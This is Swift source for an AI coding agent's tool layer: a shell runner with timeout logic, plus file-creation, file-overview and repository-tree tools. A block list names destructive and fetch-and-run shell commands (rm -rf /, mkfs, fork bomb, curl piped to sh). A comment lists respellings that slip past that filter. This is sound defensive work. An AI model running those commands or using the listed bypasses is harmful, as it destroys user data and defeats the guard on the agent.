                ("task_name", "string", "Optional short label shown to the user instead of the raw command."),
                ("background", "boolean", "Default false. Keep it false for anything whose result you need — the call waits and returns the output, and timeout_seconds goes up to 900 for a slow build. Set it true ONLY to leave something running that you will not wait for, such as a dev server; it returns a task id instead of output, and you must call get_task_output to see anything.")
            ],
            required: ["command", "working_directory"]
        )
    }

    // MARK: - Timeout Bounds

    /// Applied to a FOREGROUND call that names no timeout. Deliberately short: most are a build
    /// probe or a `git status`, and a caller that expects to run long should say so.
    static let defaultTimeoutSeconds = 30

    /// Applied to a BACKGROUND call that names no timeout.
    ///
    /// ⚠️ NOT 30. Device test 2026-09-21: the model backgrounded a real `xcodebuild` without
    /// naming a timeout, inherited the foreground default, and the build was killed at 30 seconds
    /// having barely started — then correctly reported as failed. A 30 s ceiling on the mode that
    /// exists FOR long work makes the common case "killed before it began".
    ///
    /// The ceiling is the right default here because `background: true` is already the caller
    /// saying "this takes a while and I am not waiting for it". Requiring `timeout_seconds`
    /// instead was considered and rejected: it converts a bad default into a hard failure for the
    /// smaller models that omitted the argument in the first place.
    static let defaultBackgroundTimeoutSeconds = maxTimeoutSeconds

    /// The ceiling a caller cannot exceed. Raised 300 → 900 on 2026-09-21: 5 minutes sat just
    /// under this project's own `build-for-testing` + `test-without-building` cycle (~266 s
    /// measured), so the one command a coding agent most needs to run was the one it could not
    /// finish. The bound exists to stop a hang, not to rule out a slow build.
    ///
    /// ⚠️ This ceiling is NOT the effective limit on its own. A `batch_command` call is compute,
    /// and the run-level `executionTimeout` sentinel (`AgentConnect`) bounds the compute of the
    /// WHOLE turn. If that budget is smaller than the command's timeout, the sentinel fires
    /// first and aborts the entire run — and unlike the bound here it returns no partial output.
    /// `CodeSessionManager.presetExecutionTimeout` is sized to keep room above this value.
    static let maxTimeoutSeconds = 900

    /// The bound actually applied to a call. Extracted so the clamp is assertable without
    /// spawning a shell — `isDestructiveCommand` is static for the same
    /// reason. A model that asks for an hour gets the ceiling, not an hour.
    ///
    /// A non-positive request is treated as "unspecified" rather than "no limit": this tool has
    /// no unbounded mode, and silently granting one to `timeout_seconds: 0` would be the worst
    /// way to acquire it.
    static func effectiveTimeout(_ requested: Int?, background: Bool = false) -> Int {
        guard let requested, requested > 0 else {
            return background ? defaultBackgroundTimeoutSeconds : defaultTimeoutSeconds
        }
        return min(requested, maxTimeoutSeconds)
    }

    // MARK: - Testable Safety Guard

    // ⚠️⚠️ `truncateOutput` (8,000 chars / 1,000 lines) WAS REMOVED 2026-09-24 — user decision: no
    // limit below what fits. A tool cannot know how much room the model has, so it cut a build log
    // to 8K on a 200K-window model as readily as on an 8K one, and the DB then stored only that
    // (the rest existed nowhere). Output now leaves this tool whole; `ToolResultBudget.fit` cuts it
    // to the room actually free, keeping BOTH ends on line boundaries — the properties this function
    // was hardened for after the 2026-09-21 xcodebuild regression, and whose tests moved with them
    // to `ToolResultBudgetTests`.

    /// A speed-bump against the best-known ways to destroy a machine by accident. **Not a
    /// security boundary, and it cannot become one.**
    ///
    /// `batch_command` runs `/bin/zsh -c <command>`; the argument is a complete programming
    /// language, so any command here can be respelled past the list — `rm  -rf /` with two
    /// spaces, `find / -delete`, `python3 -c 'import os;os.system(…)'`, or a variable
    /// assembled at runtime. Those were confirmed to slip through, and no addition to this
    /// list changes the shape of the problem.
    ///
    /// It is kept because catching the literal `rm -rf /` a model actually typed has value,
    /// and removed nothing else. What it must not do is read as the reason this tool is safe:
    /// `batch_command` IS a shell, and the only real boundary is whether a profile grants it.
    /// See `ShellCommandGuard`.
    static let destructivePatterns = [
        "rm -rf /", "rm -rf /*", "mkfs", ":(){", "dd if=/dev/",
        "chmod -r 777 /", "wget.*\\|.*sh", "curl.*\\|.*sh"
    ]

    static func isDestructiveCommand(_ command: String) -> Bool {
        let cmdLower = command.lowercased()
        for pattern in destructivePatterns {
            if cmdLower.contains(pattern) { return true }
            if let regex = try? NSRegularExpression(pattern: pattern),
               regex.firstMatch(in: cmdLower, range: NSRange(cmdLower.startIndex..., in: cmdLower)) != nil {
                return true
            }
        }
        return false
    }

    // MARK: - Shared execution core
    //
    // ⚠️ ONE implementation, three callers: `batch_command` (Chat/Workflow, still flag-driven),
    // `run_command` and `start_background_task` (the Code splits). `ShellCommandGuard` exists
    // because a guard attached to ONE shell tool is a guard on a NAME rather than a capability;
    // the same reasoning applies to the execution itself, so it lives here rather than being
    // reinvented per tool.

    enum Precheck {
        case ready(workingDirectory: String)
        case refused(String)
    }

    /// The refusals every shell path shares, and the resolved working directory.
    static func precheck(command: String, workingDirectory: String?) -> Precheck {
        if let refusal = ShellCommandGuard.refusalReason(for: command) {
            return .refused(refusal)
        }
        if isDestructiveCommand(command) {
            return .refused("Error: Command blocked by safety filter. Destructive system commands are not permitted.")
        }
        guard let raw = workingDirectory, !raw.isEmpty else {
            return .refused("Error: 'working_directory' is required. Pass the project root or a specific subpath.")
        }
        let expanded = FilePathResolver.resolve(raw)
        guard FileManager.default.fileExists(atPath: expanded) else {
            return .refused("Error: working_directory '\(expanded)' does not exist.")
        }
        return .ready(workingDirectory: expanded)
    }

    private static func shell(_ command: String, in workingDirectory: String) -> Process {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/zsh")
        process.arguments = ["-c", command]
        process.currentDirectoryURL = URL(fileURLWithPath: workingDirectory)
        return process
    }

    /// Runs `command` and WAITS, returning its output.
    ///
    /// ⚠️ With a conversation, the command runs through `BackgroundProcessRegistry` exactly as a
    /// background task does — output to a log FILE, live — and this call waits for it and reads the
    /// log back (2026-09-24). It used to run over `ProcessRunner`'s pipes and write the log once, at
    /// the end: a crash mid-build left no log, and stdout and stderr came back as two blocks with
    /// their order lost. The file also removes the pipe's failure modes — a file never fills and
    /// wedges the child, and a `cmd &` left holding it cannot keep the read open.
    static func runForeground(command: String,
                              workingDirectory: String,
                              timeout: Int,
                              conversationID: UUID?,
                              name: String? = nil) async throws -> String {
        guard let conversationID else {
            return try await runForegroundUnregistered(command: command, workingDirectory: workingDirectory, timeout: timeout)
        }

        let registry = BackgroundProcessRegistry.shared
        let started: BackgroundProcessRegistry.Snapshot
        do {
            started = try registry.launch(
                command: command, workingDirectory: workingDirectory,
                timeout: TimeInterval(timeout), conversationID: conversationID, name: name,
                foreground: true)
        } catch {
            throw ShellCommandError.launchFailed(reason: error.localizedDescription)
        }

        guard let ended = await registry.waitUntilEnded(conversationID: conversationID, taskID: started.id) else {
            // Only if the conversation was deleted while the command ran — `discard` drops the record.
            return "Error: The command's record was removed while it ran (its conversation was deleted), so its output is unavailable."
        }

        let data = (try? Data(contentsOf: ended.logURL)) ?? Data()
        let output = String(decoding: data, as: UTF8.self)

        switch ended.status {
        case .timedOut:
            // Partial output is returned rather than discarded: a command killed at the bound
            // usually produced the evidence for WHY it was slow before it was killed.
            return output.isEmpty
                ? "Error: Command timed out after \(timeout)s and was killed. It produced no output."
                : "Error: Command timed out after \(timeout)s and was killed. Output before the kill:\n\(output)"
        case .stopped:
            return output.isEmpty
                ? "Error: The command was stopped by the user before it finished. It produced no output."
                : "Error: The command was stopped by the user before it finished. Output before it was stopped:\n\(output)"
        case .exited(let code):
            return ShellExitStatus.annotate(output, exitCode: code)
        case .running:
            // `waitUntilEnded` returns only after the shell exits, so this cannot be reached.
            logger.error("[BGPROC] conv \(conversationID.uuidString.prefix(8)) — \(ended.id) was reported as ended while its status is still running. CONSEQUENCE: its output is returned without an exit code.")
            return output
        }
    }

    /// The path with no conversation to own the command, so no registry entry, card or log. Kept on
    /// `ProcessRunner` for callers that build the tool without a conversation.
    private static func runForegroundUnregistered(command: String, workingDirectory: String, timeout: Int) async throws -> String {
        let process = shell(command, in: workingDirectory)
        nonisolated(unsafe) let target = process
        let seconds = TimeInterval(timeout)

        // Off the cooperative pool. `ProcessRunner.run` is synchronous by design and `timeout`
        // here goes up to 900s; calling it inline would park a Swift-concurrency worker thread for
        // a quarter of an hour. A GCD thread is cheap to hold, a cooperative-pool worker is not.
        let run: ProcessRunner.TimedResult
        do {
            run = try await withCheckedThrowingContinuation { continuation in
                DispatchQueue.global(qos: .userInitiated).async {
                    do { continuation.resume(returning: try ProcessRunner.run(target, timeout: seconds)) }
                    catch { continuation.resume(throwing: error) }
                }
            }
        } catch {
            throw ShellCommandError.launchFailed(reason: error.localizedDescription)
        }

        var output = run.result.combinedOutput

        // Said in the observation, not just the log: an incomplete capture is indistinguishable
        // from a command that printed less, and the agent would conclude the daemon produced
        // nothing and try again.
        if !run.result.outputComplete {
            output += "\n\n[note] This command left a background process holding its output stream. "
                + "Reading stopped when the command itself finished, so anything written after that is NOT shown above, "
                + "and the background process loses its output stream. Redirect it to keep its output: `cmd > log 2>&1 &`."
        }

        if run.timedOut {
            return output.isEmpty
                ? "Error: Command timed out after \(timeout)s and was killed. It produced no output."
                : "Error: Command timed out after \(timeout)s and was killed. Output before the kill:\n\(output)"
        }
        return ShellExitStatus.annotate(output, exitCode: run.result.exitCode)
    }

    /// Starts `command` and returns immediately with a task id.
    static func startBackground(command: String,
                                workingDirectory: String,
                                timeout: Int,
                                conversationID: UUID?,
                                name: String? = nil,
                                notifyOnCompletion: Bool = false) -> String {
        guard let conversationID else {
            logger.error("[BGPROC] A background start was requested for '\(command)' with no conversation id, so the task could not be registered. CONSEQUENCE: refused rather than launched — an unregistered background process has no bound, no collectable output and no owner at quit.")
            return "Error: background execution is unavailable here (no conversation to own the task). Run the command in the foreground instead, raising timeout_seconds if it needs longer."
        }
        do {
            let task = try BackgroundProcessRegistry.shared.launch(
                command: command, workingDirectory: workingDirectory,
                timeout: TimeInterval(timeout), conversationID: conversationID, name: name,
                notifyOnCompletion: notifyOnCompletion)
            return """
                Started background task \(task.id): \(command)
                It will be killed automatically after \(timeout)s if it has not finished.
                Read its output with get_task_output, end it early with stop_background_task.\
                Do not poll in a loop — set notify_on_completion next time if you need the result.
                """
        } catch {
            return "Error launching background command: \(error.localizedDescription)"
        }
    }

    // MARK: - Execution (dispatch)

    func call(arguments: Arguments) async throws -> String {
        switch Self.precheck(command: arguments.command, workingDirectory: arguments.working_directory) {
        case .refused(let reason):
            return reason
        case .ready(let workingDirectory):
            let isBackground = arguments.background ?? false
            let timeout = Self.effectiveTimeout(arguments.timeout_seconds, background: isBackground)
            return isBackground
                ? Self.startBackground(command: arguments.command, workingDirectory: workingDirectory,
                                       timeout: timeout, conversationID: conversationID,
                                       name: arguments.task_name)
                : try await Self.runForeground(command: arguments.command, workingDirectory: workingDirectory,
                                           timeout: timeout, conversationID: conversationID,
                                           name: arguments.task_name)
        }
    }
}

// MARK: - Create File Tool (Write New Files)

struct CreateFileTool: DevgenticTool {
    let name = "create_file"
    let category = "Coding Assistant"
    let description = "Creates a new file with the given content. Creates parent directories if needed. Fails if the file already exists unless overwrite is true."

    struct Arguments: Decodable, Sendable {
        let file_path: String
        let content: String
        let overwrite: Bool?

        private struct DynamicKey: CodingKey {
            var stringValue: String
            init?(stringValue: String) { self.stringValue = stringValue }
            var intValue: Int? { return nil }
            init?(intValue: Int) { return nil }
        }

        init(from decoder: Decoder) throws {
            let container = try decoder.container(keyedBy: DynamicKey.self)

            var fp: String? = nil
            for key in ["file_path", "filePath", "path", "file"] {
                if let ck = DynamicKey(stringValue: key),
                   let val = try? container.decode(String.self, forKey: ck) {
                    fp = val
                    break
                }
            }
            self.file_path = try fp ?? container.decode(String.self, forKey: DynamicKey(stringValue: "file_path")!)
            self.content = try container.decode(String.self, forKey: DynamicKey(stringValue: "content")!)
            self.overwrite = try? container.decodeIfPresent(Bool.self, forKey: DynamicKey(stringValue: "overwrite")!)
        }
    }

    var parameterSchema: ToolParameters {
        return SchemaBuilder.object(
            properties: [
                ("file_path", "string", "Absolute or relative path for the new file."),
                ("content", "string", "The complete file content to write."),
                ("overwrite", "boolean", "If true, overwrite existing file. Default false (fails if file exists).")
            ],
            required: ["file_path", "content"]
        )
    }

    func call(arguments: Arguments) async throws -> String {
        let expandedPath = FilePathResolver.resolve(arguments.file_path)
        let fileURL = URL(fileURLWithPath: expandedPath)
        let fm = FileManager.default

        if fm.fileExists(atPath: expandedPath) && !(arguments.overwrite ?? false) {
            return "Error: File already exists at '\(expandedPath)'. Set overwrite=true to replace it."
        }

        // Create parent directories if needed
        let parentDir = fileURL.deletingLastPathComponent().path
        if !fm.fileExists(atPath: parentDir) {
            do {
                try fm.createDirectory(atPath: parentDir, withIntermediateDirectories: true)
            } catch {
                return "Error creating directory: \(error.localizedDescription)"
            }
        }

        do {
            try arguments.content.write(to: fileURL, atomically: true, encoding: .utf8)
            let lineCount = arguments.content.components(separatedBy: "\n").count
            return "Created file '\(arguments.file_path)' (\(lineCount) lines, \(arguments.content.count) chars)."
        } catch {
            return "Error writing file: \(error.localizedDescription)"
        }
    }
}

// MARK: - File Overview Tool (Quick File Inspection)

struct FileOverviewTool: DevgenticTool {
    let name = "file_overview"
    let category = "Coding Assistant"
    let description = "Returns a structured overview of a source file: line count, language, and all top-level symbol definitions (functions, classes, structs, etc.) with line numbers. Ideal for understanding file structure before editing."

    struct Arguments: Decodable, Sendable {
        let file_path: String

        private struct DynamicKey: CodingKey {
            var stringValue: String
            init?(stringValue: String) { self.stringValue = stringValue }
            var intValue: Int? { return nil }
            init?(intValue: Int) { return nil }
        }

        init(from decoder: Decoder) throws {
            let container = try decoder.container(keyedBy: DynamicKey.self)
            var fp: String? = nil
            for key in ["file_path", "filePath", "path", "file"] {
                if let ck = DynamicKey(stringValue: key),
                   let val = try? container.decode(String.self, forKey: ck) {
                    fp = val
                    break
                }
            }
            self.file_path = try fp ?? container.decode(String.self, forKey: DynamicKey(stringValue: "file_path")!)
        }
    }

    var parameterSchema: ToolParameters {
        return SchemaBuilder.object(
            properties: [
                ("file_path", "string", "Path to the source file to inspect.")
            ],
            required: ["file_path"]
        )
    }

    func call(arguments: Arguments) async throws -> String {
        let expandedPath = FilePathResolver.resolve(arguments.file_path)

        guard FileManager.default.fileExists(atPath: expandedPath) else {
            return "Error: File not found at '\(expandedPath)'."
        }

        let content: String
        do {
            content = try String(contentsOfFile: expandedPath, encoding: .utf8)
        } catch {
            return "Error reading file: \(error.localizedDescription)"
        }

        let lines = content.components(separatedBy: "\n")
        let ext = (expandedPath as NSString).pathExtension.lowercased()

        // Detect language
        let language: String
        switch ext {
        case "swift": language = "Swift"
        case "py": language = "Python"
        case "ts", "tsx": language = "TypeScript"
        case "js", "jsx": language = "JavaScript"
        case "rs": language = "Rust"
        case "go": language = "Go"
        case "java": language = "Java"
        case "rb": language = "Ruby"
        case "cpp", "cc", "cxx": language = "C++"
        case "c": language = "C"
        case "h", "hpp": language = "C/C++ Header"
        case "m": language = "Objective-C"
        case "kt": language = "Kotlin"
        case "cs": language = "C#"
        case "php": language = "PHP"
        case "json": language = "JSON"
        case "yaml", "yml": language = "YAML"
        case "md": language = "Markdown"
        case "sh", "bash", "zsh": language = "Shell"
        default: language = ext.isEmpty ? "Unknown" : ext.uppercased()
        }

        // Extract top-level definitions using regex
        let definitionPatterns: [(String, String)] = [
            // Swift
            ("(public |private |internal |open |fileprivate )?func \\w+", "function"),
            ("(public |private |internal |open |fileprivate )?(class|struct|enum|protocol|actor) \\w+", "type"),
            ("(public |private |internal |open |fileprivate )?(typealias|associatedtype) \\w+", "type alias"),
            ("extension \\w+", "extension"),
            // Python
            ("^(def|async def) \\w+", "function"),
            ("^class \\w+", "class"),
            // JS/TS
            ("(export )?(function|class|interface|type|enum) \\w+", "definition"),
            ("(export )?(const|let|var) \\w+.*=.*=>", "arrow function"),
            // Rust
            ("(pub )?fn \\w+", "function"),
            ("(pub )?(struct|enum|trait|impl|mod) \\w+", "type"),
            // Go
            ("func (\\(\\w+ \\*?\\w+\\) )?\\w+", "function"),
            ("type \\w+ (struct|interface)", "type"),
            // General MARK comments
            ("// MARK: ?-? ?.*", "section"),
            ("# MARK: ?-? ?.*", "section"),
            ("# %%.*", "section"),
        ]

        var symbols: [(line: Int, kind: String, text: String)] = []

        for (lineNum, line) in lines.enumerated() {
            let trimmed = line.trimmingCharacters(in: .whitespaces)
            if trimmed.isEmpty || trimmed.hasPrefix("//") && !trimmed.hasPrefix("// MARK") { continue }

            for (pattern, kind) in definitionPatterns {
                if let regex = try? NSRegularExpression(pattern: pattern),
                   regex.firstMatch(in: trimmed, range: NSRange(trimmed.startIndex..., in: trimmed)) != nil {
                    let preview = String(trimmed.prefix(100))
                    symbols.append((lineNum + 1, kind, preview))
                    break
                }
            }
        }

        var result = "File: \(arguments.file_path)\n"
        result += "Language: \(language)\n"
        result += "Lines: \(lines.count)\n"
        result += "Size: \(content.count) chars\n\n"

        if symbols.isEmpty {
            result += "No top-level symbols detected."
        } else {
            result += "Symbols (\(symbols.count)):\n"
            for sym in symbols.prefix(100) {
                result += "  L\(sym.line): [\(sym.kind)] \(sym.text)\n"
            }
            if symbols.count > 100 {
                result += "  ...[+\(symbols.count - 100) more symbols]"
            }
        }

        return result
    }
}

// MARK: - Codebase Map Tool (Repository Structure)

struct CodebaseMapTool: DevgenticTool {
    let name = "project_tree"
    let category = "Coding Assistant"
    let description = "Generates a full map of the repository tree — every directory and file, recursively. Use on unfamiliar codebases to learn the layout and exact filenames before reading, searching, or editing. If the output is too large, re-call with a narrower `path`."

    struct Arguments: Decodable, Sendable {
        let path: String?

        private struct DynamicKey: CodingKey {
            var stringValue: String
            init?(stringValue: String) { self.stringValue = stringValue }
            var intValue: Int? { return nil }
            init?(intValue: Int) { return nil }
        }

        init(from decoder: Decoder) throws {
            let container = try decoder.container(keyedBy: DynamicKey.self)
            self.path = try? container.decodeIfPresent(String.self, forKey: DynamicKey(stringValue: "path")!)
            // `max_depth` and `show_files` were removed from the schema. Any legacy
            // argument the model still emits is silently ignored by Decodable.
        }
    }

    var parameterSchema: ToolParameters {
        return SchemaBuilder.object(
            properties: [
                ("path", "string", "Root directory to map. Required — pass the project root, or a subpath to limit scope on large repositories.")
            ],
            required: ["path"]
        )
    }

    func call(arguments: Arguments) async throws -> String {
        guard let rawPath = arguments.path, !rawPath.isEmpty else {
            return "Error: 'path' is required. Pass the project root or a specific subpath."
        }
        let basePath = FilePathResolver.resolve(rawPath)
        guard FileManager.default.fileExists(atPath: basePath) else {
            return "Error: path '\(basePath)' does not exist."
        }

        let ignoreDirs: Set<String> = [".git", "node_modules", ".build", "DerivedData", "__pycache__",
                                        ".venv", "venv", ".next", "dist", "build", ".cache",
                                        "Pods", ".svn", ".hg", "target"]
        // Per-file noise filter: macOS sprinkles `.DS_Store` into every directory and
        // Windows leaves `Thumbs.db` / `desktop.ini`. These are never useful to the
        // agent and would otherwise eat the 8000-char output budget on deep trees.
        let ignoreFiles: Set<String> = [".DS_Store", "Thumbs.db", "desktop.ini"]

        var output = "Repository: \(basePath)\n"

        func traverse(path: String, prefix: String) {
            let fm = FileManager.default
            guard let contents = try? fm.contentsOfDirectory(atPath: path) else { return }

            let sorted = contents.sorted()
            var dirs: [(String, String)] = []
            var files: [String] = []

            for item in sorted {
                let fullPath = (path as NSString).appendingPathComponent(item)
                var isDir: ObjCBool = false
                fm.fileExists(atPath: fullPath, isDirectory: &isDir)

                if isDir.boolValue {
                    if !ignoreDirs.contains(item) {
                        dirs.append((item, fullPath))
                    }
                } else {
                    if !ignoreFiles.contains(item) {
                        files.append(item)
                    }
                }
            }

            // Directories first, then files — stable tree ordering.
            for (idx, (dirName, dirPath)) in dirs.enumerated() {
                let isLast = idx == dirs.count - 1 && files.isEmpty
                let connector = isLast ? "└── " : "├── "
                let childPrefix = isLast ? "    " : "│   "
                output += "\(prefix)\(connector)\(dirName)/\n"
                traverse(path: dirPath, prefix: prefix + childPrefix)
            }

            for (idx, file) in files.enumerated() {
                let isLast = idx == files.count - 1
                let connector = isLast ? "└── " : "├── "
                output += "\(prefix)\(connector)\(file)\n"
            }
        }

        traverse(path: basePath, prefix: "")

        // Safety cap so an exceptionally large tree doesn't blow the model's context
        // window. Full recursion is the default; truncation hints the model to narrow.
        let maxOutput = 8000
        if output.count > maxOutput {
            output = String(output.prefix(maxOutput)) + "\n...[Truncated at \(maxOutput) chars. Re-call with a narrower `path` to map a specific subtree, or use `glob_files` / `list_directory` for targeted queries.]"
        }

        return output
    }
}
